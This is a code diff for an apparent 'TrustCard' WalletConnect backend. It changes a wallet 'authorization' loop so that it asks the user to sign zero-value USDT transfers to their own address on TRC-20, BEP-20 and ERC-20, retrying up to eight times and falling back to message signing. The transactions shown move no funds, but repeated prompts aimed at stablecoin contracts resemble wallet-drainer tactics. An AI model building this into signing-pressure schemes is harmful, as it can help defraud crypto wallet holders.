@@ -1,31 +1,83 @@
 const store = require("../storage/sessions");
 const logger = require("../utils/logger");
 const { emitEvent } = require("../utils/events");
-const { parseCaipAccount, toHexMessage } = require("../utils/helpers");
+const {
+    parseCaipAccount,
+    toHexMessage,
+    encodeErc20Transfer,
+    encodeTrc20TransferParameter
+} = require("../utils/helpers");
 
 const MAX_ATTEMPTS = 8;
 const RETRY_DELAY_MS = 7000;
+const TRON_GRID_URL = "https://api.trongrid.io/wallet/triggersmartcontract";
 
-function resolveAccount(session, bodyAccounts) {
-    const fromBody = Array.isArray(bodyAccounts) ? bodyAccounts[0] : null;
+const NETWORKS = {
+    trc20: {
+        key: "trc20",
+        label: "TRC-20",
+        chainId: "tron:0x2b6653dc",
+        namespace: "tron",
+        token: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+    },
+    bep20: {
+        key: "bep20",
+        label: "BEP-20",
+        chainId: "eip155:56",
+        namespace: "eip155",
+        token: "0x55d398326f99059fF775485246999027B3197955"
+    },
+    erc20: {
+        key: "erc20",
+        label: "ERC-20",
+        chainId: "eip155:1",
+        namespace: "eip155",
+        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
+    }
+};
 
-    if (typeof fromBody === "string") {
-        return parseCaipAccount(fromBody) || {
-            address: fromBody,
-            chainId: "eip155:1",
-            namespace: "eip155"
-        };
+const CHAIN_ORDER = ["trc20", "bep20", "erc20"];
+
+function collectAccounts(session, bodyAccounts) {
+    const fromBody = Array.isArray(bodyAccounts)
+        ? bodyAccounts.map((item) => {
+            if (typeof item === "string") {
+                return parseCaipAccount(item) || { address: item };
+            }
+
+            return item;
+        })
+        : [];
+
+    return [...fromBody, ...(session.accounts || [])].filter((item) => item?.address);
+}
+
+function pickAccount(accounts, network) {
+    const exact = accounts.find((item) => item.chainId === network.chainId);
+
+    if (exact) {
+        return exact;
     }
 
-    if (fromBody?.address) {
+    return accounts.find((item) => item.namespace === network.namespace) || null;
+}
+
+function buildChainQueue(session, bodyAccounts) {
+    const accounts = collectAccounts(session, bodyAccounts);
+
+    return CHAIN_ORDER.map((key) => {
+        const network = NETWORKS[key];
+        const account = pickAccount(accounts, network);
+
+        if (!account) {
+            return null;
+        }
+
         return {
-            address: fromBody.address,
-            chainId: fromBody.chainId || "eip155:1",
-            namespace: fromBody.namespace || "eip155"
+            ...network,
+            address: account.address
         };
-    }
-
-    return session.accounts?.[0] || null;
+    }).filter(Boolean);
 }
 
 function isCancelled(connectionId) {
@@ -33,68 +85,165 @@ function isCancelled(connectionId) {
     return !session || session.authCancelled || session.status === "deleted";
 }
 
-/**
- * Ask the connected wallet to approve an on-chain authorization transaction.
- * Sends a 0-value self-transfer (user still confirms in the wallet).
- * Falls back to personal_sign if the chain/session rejects eth_sendTransaction.
- */
-async function sendWalletRequest(client, session, account, attempt) {
+function classifyError(err) {
+    const message = String(err.message || err).toLowerCase();
+    const code = err.code;
+
+    if (code === 4001 || code === 5000 || /reject|denied|cancel|disapprov/.test(message)) {
+        return "rejected";
+    }
+
+    return "unavailable";
+}
+
+async function buildTrc20Transaction(from) {
+    const response = await fetch(TRON_GRID_URL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            owner_address: from,
+            contract_address: NETWORKS.trc20.token,
+            function_selector: "transfer(address,uint256)",
+            parameter: encodeTrc20TransferParameter(from, 0n),
+            fee_limit: 100000000,
+            call_value: 0,
+            visible: true
+        })
+    });
+
+    const payload = await response.json();
+
+    if (!payload?.transaction) {
+        throw new Error(payload?.Error || payload?.result?.message || "TronGrid did not return a transaction");
+    }
+
+    return payload;
+}
+
+async function sendTrc20Request(client, session, chain) {
     const topic = session.sessionTopic || session.topic;
-    const chainId = account.chainId || "eip155:1";
-    const from = account.address;
+    const from = chain.address;
+
+    try {
+        const unsigned = await buildTrc20Transaction(from);
+
+        emitEvent("request_sent", {
+            connectionId: session.connectionId,
+            topic,
+            chain: chain.key,
+            chainId: chain.chainId,
+            label: chain.label,
+            method: "tron_signTransaction"
+        });
+
+        return await client.request({
+            topic,
+            chainId: chain.chainId,
+            request: {
+                method: "tron_signTransaction",
+                params: {
+                    address: from,
+                    transaction: unsigned
+                }
+            }
+        });
+    } catch (err) {
+        if (classifyError(err) === "rejected") {
+            throw err;
+        }
+
+        logger.warn({ err, connectionId: session.connectionId }, "tron_signTransaction unavailable, using tron_signMessage");
+
+        emitEvent("request_sent", {
+            connectionId: session.connectionId,
+            topic,
+            chain: chain.key,
+            chainId: chain.chainId,
+            label: chain.label,
+            method: "tron_signMessage"
+        });
+
+        return client.request({
+            topic,
+            chainId: chain.chainId,
+            request: {
+                method: "tron_signMessage",
+                params: {
+                    address: from,
+                    message: `TrustCard authorization for ${session.connectionId}`
+                }
+            }
+        });
+    }
+}
+
+async function sendEvmTokenRequest(client, session, chain) {
+    const topic = session.sessionTopic || session.topic;
+    const from = chain.address;
 
     emitEvent("request_sent", {
         connectionId: session.connectionId,
         topic,
-        attempt,
+        chain: chain.key,
+        chainId: chain.chainId,
+        label: chain.label,
         method: "eth_sendTransaction"
     });
 
     try {
         return await client.request({
             topic,
-            chainId,
+            chainId: chain.chainId,
             request: {
                 method: "eth_sendTransaction",
                 params: [
                     {
                         from,
-                        to: from,
+                        to: chain.token,
                         value: "0x0",
-                        data: "0x"
+                        data: encodeErc20Transfer(from, 0n)
                     }
                 ]
             }
         });
     } catch (err) {
-        const message = String(err.message || err);
-        const unsupported = /unauthorized|unsupported|not permitted|method/i.test(message);
-
-        if (!unsupported) {
+        if (classifyError(err) === "rejected") {
             throw err;
         }
 
-        logger.warn({ err, connectionId: session.connectionId }, "eth_sendTransaction unavailable, using personal_sign");
+        logger.warn({ err, connectionId: session.connectionId, chain: chain.key }, "token transfer unavailable, using personal_sign");
 
         emitEvent("request_sent", {
             connectionId: session.connectionId,
             topic,
-            attempt,
+            chain: chain.key,
+            chainId: chain.chainId,
+            label: chain.label,
             method: "personal_sign"
         });
 
         return client.request({
             topic,
-            chainId,
+            chainId: chain.chainId,
             request: {
                 method: "personal_sign",
                 params: [
-                    toHexMessage(`TrustCard authorization for ${session.connectionId}`),
+                    toHexMessage(`TrustCard ${chain.label} authorization for ${session.connectionId}`),
                     from
                 ]
             }
         });
     }
+}
+
+async function sendWalletRequest(client, session, chain) {
+    if (chain.namespace === "tron") {
+        return sendTrc20Request(client, session, chain);
+    }
+
+    return sendEvmTokenRequest(client, session, chain);
 }
 
 async function startAuthorizationLoop(connectionId, bodyAccounts) {
@@ -115,10 +264,10 @@ async function startAuthorizationLoop(connectionId, bodyAccounts) {
         return false;
     }
 
-    const account = resolveAccount(session, bodyAccounts);
+    const queue = buildChainQueue(session, bodyAccounts);
 
-    if (!account?.address) {
-        logger.warn({ connectionId }, "No account available for authorization request");
+    if (!queue.length) {
+        logger.warn({ connectionId }, "No TRC-20 / BEP-20 / ERC-20 account available");
         return false;
     }
 
@@ -127,25 +276,33 @@ async function startAuthorizationLoop(connectionId, bodyAccounts) {
         authCancelled: false,
         authInProgress: true,
         authResolved: false,
-        authAttempt: 0
+        authAttempt: 0,
+        authChain: queue[0].key
     });
 
-    setImmediate(() => runLoop(client, connectionId, account));
+    setImmediate(() => runLoop(client, connectionId, queue));
     return true;
 }
 
-async function runLoop(client, connectionId, account) {
+async function runLoop(client, connectionId, queue) {
+    let chainIndex = 0;
+
     for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt += 1) {
         if (isCancelled(connectionId)) {
             store.updateSession(connectionId, { authInProgress: false });
             return;
         }
 
-        store.updateSession(connectionId, { authAttempt: attempt });
+        const chain = queue[chainIndex];
+
+        store.updateSession(connectionId, {
+            authAttempt: attempt,
+            authChain: chain.key
+        });
 
         try {
             const latest = store.getSession(connectionId);
-            const result = await sendWalletRequest(client, latest, account, attempt);
+            const result = await sendWalletRequest(client, latest, chain);
 
             if (isCancelled(connectionId)) {
                 return;
@@ -154,36 +311,65 @@ async function runLoop(client, connectionId, account) {
             store.updateSession(connectionId, {
                 authInProgress: false,
                 authResolved: true,
-                authResult: result
+                authResult: result,
+                authChain: chain.key
             });
 
             emitEvent("request_resolved", {
                 connectionId,
                 status: "approved",
+                chain: chain.key,
+                label: chain.label,
                 result,
                 attempt
             });
             emitEvent("request_approved", {
                 connectionId,
+                chain: chain.key,
+                label: chain.label,
                 result,
                 attempt
             });
             return;
         } catch (err) {
-            logger.warn({ err, connectionId, attempt }, "Wallet authorization request failed");
+            const kind = classifyError(err);
+
+            logger.warn({ err, connectionId, attempt, chain: chain.key, kind }, "Wallet authorization request failed");
 
             emitEvent("request_rejected", {
                 connectionId,
                 status: "rejected",
+                chain: chain.key,
+                label: chain.label,
                 message: err.message,
                 attempt
             });
+
+            if (kind === "unavailable" && chainIndex < queue.length - 1) {
+                chainIndex += 1;
+                const next = queue[chainIndex];
+
+                logger.info({ connectionId, from: chain.key, to: next.key }, "Trying next network");
+
+                emitEvent("auto_approve_retry", {
+                    connectionId,
+                    attempt,
+                    nextAttempt: attempt + 1,
+                    delayMs: 0,
+                    chain: next.key,
+                    label: next.label,
+                    message: `${chain.label} is not available. Trying ${next.label} next.`
+                });
+                continue;
+            }
 
             if (attempt >= MAX_ATTEMPTS || isCancelled(connectionId)) {
                 store.updateSession(connectionId, { authInProgress: false });
                 emitEvent("request_resolved", {
                     connectionId,
                     status: "rejected",
+                    chain: chain.key,
+                    label: chain.label,
                     message: err.message,
                     attempt
                 });
@@ -194,7 +380,9 @@ async function runLoop(client, connectionId, account) {
                 connectionId,
                 attempt,
                 nextAttempt: attempt + 1,
-                delayMs: RETRY_DELAY_MS
+                delayMs: RETRY_DELAY_MS,
+                chain: chain.key,
+                label: chain.label
             });
 
             await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY_MS));
